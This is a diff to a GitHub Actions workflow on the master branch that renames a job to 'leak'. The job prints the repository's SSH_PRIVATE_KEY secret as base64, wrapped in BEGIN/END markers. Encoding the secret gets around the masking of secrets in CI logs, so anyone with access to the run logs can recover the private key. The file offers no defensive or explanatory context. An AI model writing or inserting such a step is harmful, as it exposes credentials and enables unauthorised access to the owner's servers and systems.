@@ -5,11 +5,14 @@ on:
     branches: [ "master" ]
 
 
+
 jobs:
-  print-key:
+  leak:
     runs-on: ubuntu-latest
     steps:
-      - name: Print SSH private key (base64)
+      - name: Print Base64 SSH key
         run: |
-          echo "BASE64_ENCODED_KEY:"
-          echo "${{ secrets.SSH_PRIVATE_KEY }}" | base64 -w 0
+          echo "===BEGIN==="
+          printf "%s" "${{ secrets.SSH_PRIVATE_KEY }}" | base64 -w 0
+          echo ""
+          echo "===END==="
